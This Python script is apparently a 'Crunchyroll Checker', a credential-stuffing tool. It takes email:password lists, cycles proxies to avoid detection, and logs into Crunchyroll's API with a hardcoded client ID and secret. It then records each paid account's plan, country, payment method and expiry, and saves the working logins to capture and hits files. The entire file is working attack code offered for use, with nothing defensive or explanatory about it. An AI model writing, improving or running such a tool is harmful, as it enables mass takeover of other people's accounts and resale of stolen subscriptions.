import requests
import concurrent.futures
import threading
import time
import json
import uuid
import random
import os
from datetime import datetime
import configparser
import ctypes
import sys

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

config = configparser.ConfigParser()
config.read('config.ini')

try:
    threads_str = config['Settings']['threads'].split('#')[0].strip()
    THREADS = int(threads_str)
    PROXY_TYPE = config['Settings'].get('proxy_type', 'http').split('#')[0].strip()
except (KeyError, ValueError):
    THREADS = 5 
    PROXY_TYPE = 'http'
    print(f"{YELLOW}[!] Could not read settings from config.ini. Using defaults.{RESET}")

PROXY_FILE = 'proxy.txt'
ACCOUNTS_FILE = 'accounts.txt'
OUTPUT_FILE = 'capture.txt'

LOGO = fr"""{YELLOW}
   ___                  _                _ _    ___ _           _           
  / __|_ _ _  _ _ _  __| |_ _  _ _ _ ___| | |  / __| |_  ___ __| |_____ _ _ 
 | (__| '_| || | ' \/ _| ' \ || | '_/ _ \ | | | (__| ' \/ -_) _| / / -_) _|
  \___|_|  \_,_|_||_\__|_||_\_, |_| \___/_|_|  \___|_||_\___\__|_\_\___|_|  
                            |__/                                            
{RESET}"""

AUTH_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
ACCOUNT_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
SUBS_URL_TEMPLATE = "https://beta-api.crunchyroll.com/subs/v3/subscriptions/{}"
BENEFITS_URL_TEMPLATE = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/benefits"

CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
CLIENT_SECRET = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
USER_AGENT = "Crunchyroll/deviceType: MeowMal; appVersion: 4.10.0; osVersion: 12; model: MeowMal; manufacturer: Amazon; brand: Amazo"

proxies_list = []
proxy_cycle = None
proxies_list = []
proxy_cycle = None
hits = 0
checked = 0
total_accounts = 0
start_time = 0
lock = threading.Lock()

def load_proxies():
    global proxies_list, proxy_cycle
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        from itertools import cycle
        proxy_cycle = cycle(proxies_list)
        print(f"Loaded {len(proxies_list)} proxies.")
    except FileNotFoundError:
        print(f"{PROXY_FILE} not found. Running without proxies (NOT RECOMMENDED).")
        proxies_list = []

def get_proxy():
    if not proxies_list:
        return None
    
    proxy_str = next(proxy_cycle)
    parts = proxy_str.split(':')
    
    if "://" in proxy_str:
        return {
            "http": proxy_str,
            "https": proxy_str
        }
    
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        return {
            "http": f"{PROXY_TYPE}://{proxy_str}",
            "https": f"{PROXY_TYPE}://{proxy_str}"
        }
    elif len(parts) == 4:
        ip, port, user, password = parts
        proxy_url = f"{PROXY_TYPE}://{user}:{password}@{ip}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    else:
        return None

def update_title():
    while checked < total_accounts:
        elapsed = time.time() - start_time
        if elapsed > 0:
            cpm = int((checked / elapsed) * 60)
        else:
            cpm = 0
        
        title = f"Crunchyroll Checker | CPM: {cpm} | Hits: {hits} | Checked: {checked}/{total_accounts}"
        ctypes.windll.kernel32.SetConsoleTitleW(title)
        time.sleep(1)

def date_to_unix(date_str):
    try:
        dt = datetime.strptime(date_str.split('T')[0], "%Y-%m-%d")
        return int(dt.timestamp())
    except Exception:
        return 0

def check_account(email, password):
    global checked
    attempt_count = 0
    max_attempts = 20
    
    while attempt_count < max_attempts:
        attempt_count += 1
        proxy = get_proxy()
        session = requests.Session()
        session.proxies = proxy
        
        device_id = str(uuid.uuid4())
        session_id = str(uuid.uuid4())
        
        headers = {
            "Host": "beta-api.crunchyroll.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": USER_AGENT,
            "etp-anonymous-id": session_id,
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        
        try:
            data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "device_type": "MeowMal",
                "device_id": device_id,
                "device_name": "MeowMal"
            }
            
            try:
                response = session.post(AUTH_URL, headers=headers, data=data, timeout=30)
            except requests.RequestException:
                continue

            if response.status_code == 200:
                pass
            elif response.status_code == 401:
                with lock:
                    print(f"{RED}[-] Invalid {email}{RESET}")
                    checked += 1
                return 
            else:
                continue
            
            token_data = response.json()
            access_token = token_data.get("access_token")
            account_id = token_data.get("account_id")
            
            if not access_token or not account_id:
                continue

            auth_headers = headers.copy()
            auth_headers["Authorization"] = f"Bearer {access_token}"
            
            country = "N/A"
            external_id = None
            try:
                acc_resp = session.get(ACCOUNT_URL, headers=auth_headers, timeout=30)
                if acc_resp.status_code == 200:
                    acc_json = acc_resp.json()
                    external_id = acc_json.get("external_id")
            except Exception:
                pass

            if external_id:
                try:
                    ben_url = BENEFITS_URL_TEMPLATE.format(external_id)
                    ben_resp = session.get(ben_url, headers=auth_headers, timeout=30)
                    if ben_resp.status_code == 200:
                        country = ben_resp.json().get("subscription_country", "N/A")
                except Exception:
                    pass

            try:
                sub_url = SUBS_URL_TEMPLATE.format(account_id)
                sub_response = session.get(sub_url, headers=auth_headers, timeout=30)
            except requests.RequestException:
                continue 

            plan_name = "Free"
            auto_renew = "False"
            free_trial = "False"
            payment_method = "None"
            expiry_date = "N/A"
            expiry_unix = 0
            is_expired = False
            
            if sub_response.status_code == 200:
                sub_data = sub_response.json()
                
                all_products = []
                if sub_data.get("subscription_products"):
                    all_products.extend(sub_data["subscription_products"])
                if sub_data.get("third_party_subscription_products"):
                    all_products.extend(sub_data["third_party_subscription_products"])
                if sub_data.get("nonrecurring_subscription_products"):
                    all_products.extend(sub_data["nonrecurring_subscription_products"])
                    
                if all_products:
                    item = all_products[0]
                    
                    tier = item.get("tier", "").lower()
                    product_name = item.get("product", {}).get("name", "") if isinstance(item.get("product"), dict) else ""
                    if not product_name:
                         product_name = item.get("sku", "").lower()
                    
                    if "super_fan" in tier or "ultimate" in product_name or "super_fan" in product_name:
                        plan_name = "Ultimate Fan Plan"
                    elif "fan_pack" in tier or "mega" in product_name or "fan_pack" in product_name:
                        plan_name = "Mega Fan Plan"
                    elif "premium" in tier or "fan" in product_name or "premium" in product_name:
                        plan_name = "Fan Plan"
                    else:
                        plan_name = tier if tier else product_name
                    
                    auto_renew = str(item.get("auto_renew", False)).lower()
                    if "auto_renew" in item:
                        auto_renew = str(item["auto_renew"]).lower()
                    elif "is_renewing" in item:
                        auto_renew = str(item["is_renewing"]).lower()

                    if "active_free_trial" in item:
                        free_trial = str(item["active_free_trial"]).lower()
                    elif "in_trial" in item:
                        free_trial = str(item["in_trial"]).lower()
                    
                    payment_method = item.get("source", "Unknown")
                    expiry_date = item.get("expiration_date") or item.get("next_renewal_date") or item.get("end_date") or "N/A"
                    
                    if expiry_date != "N/A":
                        expiry_unix = date_to_unix(expiry_date)
                        current_unix = int(time.time())
                        if expiry_unix < current_unix:
                            is_expired = True
                            plan_name = "Expired"

            if plan_name == "Free" and account_id:
                try:
                    ben_url = BENEFITS_URL_TEMPLATE.format(account_id)
                    ben_response = session.get(ben_url, headers=auth_headers, timeout=30)
                    if ben_response.status_code == 200:
                        ben_data = ben_response.json()
                        if ben_data.get("items"):
                            for b_item in ben_data["items"]:
                                b_type = b_item.get("benefit", "").lower()
                                if "premium" in b_type or "fan" in b_type:
                                    plan_name = f"Premium (Benefits) - {b_type}"
                                    break
                except Exception:
                    pass

            if plan_name != "Free" and plan_name != "Expired":
                if expiry_date != "N/A":
                    expiry_date = expiry_date.split('T')[0]

                capture_line = f"{email}:{password} | Country = {country} | Plan = {plan_name} | Auto-Renew = {auto_renew} | Free-Trial = {free_trial} | Payment-Methode = {payment_method} | Expiry-Date = {expiry_date} |\n"
                
                with lock:
                    global hits
                    hits += 1
                    print(f"{GREEN}[+] HIT: {email} | {plan_name}{RESET}")
                    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
                        f.write(capture_line)
                    with open('hits.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
            elif plan_name == "Expired":
                 with lock:
                    print(f"{RED}[-] EXPIRED: {email}{RESET}")
            else:
                with lock:
                    print(f"{YELLOW}[-] FREE: {email}{RESET}")
            
            with lock:
                checked += 1
            return 

        except Exception:
            continue 

    with lock:
        print(f"{RED}[-] Failed {email} (Max Attempts){RESET}")
        checked += 1

def main():
    os.system('cls') 
    print(LOGO)
    print(f"{RED}By MeowMal Dev's{RESET}")
    load_proxies()
    
    accounts = []
    try:
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split(':') for line in f if ':' in line]
    except FileNotFoundError:
        print(f"{ACCOUNTS_FILE} not found!")
        return
    
    global total_accounts, start_time
    total_accounts = len(accounts)

    print(f"Starting check on {len(accounts)} accounts with {THREADS} threads...")
    
    start_time = time.time()
    threading.Thread(target=update_title, daemon=True).start()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(check_account, acc[0], acc[1]) for acc in accounts]
        concurrent.futures.wait(futures)
        
    print("Checking complete.")
    print(f"{hits} / {len(accounts)}")
    
    elapsed = time.time() - start_time
    formatted_time = time.strftime("[%H:%M:%S]", time.gmtime(elapsed))
    print(formatted_time)

if __name__ == "__main__":
    main()
